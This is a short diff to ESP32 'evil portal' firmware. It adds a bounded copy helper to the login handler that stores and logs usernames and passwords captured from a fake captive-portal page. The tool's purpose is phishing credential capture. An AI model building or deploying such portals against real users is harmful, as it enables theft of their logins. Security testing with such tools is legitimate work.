@@ -7,7 +7,6 @@
 
 #include <ctype.h>
 #include <stddef.h>
-#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 
@@ -115,6 +114,18 @@ static void sanitize(char *s)
             *s = '.';
         }
     }
+}
+
+// Bounded copy of a NUL-terminated string into dst (never overflows, always NUL-terminates). Manual rather
+// than snprintf("%s") because ESP-IDF's -Werror build treats the %s -Wformat-truncation note as fatal.
+static void store_field(char *dst, size_t dstsz, const char *src)
+{
+    size_t n = strlen(src);
+    if (n >= dstsz) {
+        n = dstsz - 1;
+    }
+    memcpy(dst, src, n);
+    dst[n] = '\0';
 }
 
 void lxveos_evilportal_creds_each(lxveos_evilportal_cred_cb cb)
@@ -235,8 +246,8 @@ static esp_err_t login_post_handler(httpd_req_t *req)
     sanitize(pass);
     s_captures++;
     size_t slot = (s_captures - 1) % EP_MAX_CREDS;
-    snprintf(s_creds[slot].user, sizeof(s_creds[slot].user), "%s", user);
-    snprintf(s_creds[slot].pass, sizeof(s_creds[slot].pass), "%s", pass);
+    store_field(s_creds[slot].user, sizeof(s_creds[slot].user), user);
+    store_field(s_creds[slot].pass, sizeof(s_creds[slot].pass), pass);
     ESP_LOGW(TAG, "captured credential #%u: user='%s' pass='%s'", (unsigned)s_captures, user, pass);
 
     httpd_resp_set_type(req, "text/html");
